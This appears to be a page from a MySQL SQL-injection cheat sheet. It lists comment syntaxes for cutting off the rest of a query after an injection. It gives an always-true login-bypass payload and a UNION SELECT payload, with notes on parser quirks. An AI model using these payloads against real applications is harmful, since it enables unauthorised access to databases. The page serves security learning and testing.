---
title: Comment Out Query
description: Techniques for commenting out the remainder of SQL queries in MySQL
category: Basics
order: 3
tags: ["comments", "basics", "query manipulation"]
lastUpdated: 2026-10-08
---

The following methods can be used to comment out the rest of a query after your injection:

| Comment Syntax | Description     |
| -------------- | --------------- |
| `#`            | Hash comment    |
| `/*`           | C-style comment |
| `-- -`         | SQL comment     |
| `;%00`         | Nullbyte        |
| `` ` ``        | Backtick        |

## Examples

```sql
SELECT * FROM Users WHERE username = '' OR 1=1 -- -' AND password = '';
```

```sql
SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3`';
```

## Notes

- The backtick can only be used to end a query when used as an alias
- `--` is only a comment when followed by whitespace or a control character. Without one it is two minus signs: `SELECT 1--1` returns `2` (`1 - (-1)`), where PostgreSQL, SQL Server and Oracle return `1`. This is why payloads end with `-- -` rather than `--`
- `--` and `#` comments end only at a line feed (`%0A`), not at a carriage return (`%0D`), unlike PostgreSQL and SQL Server
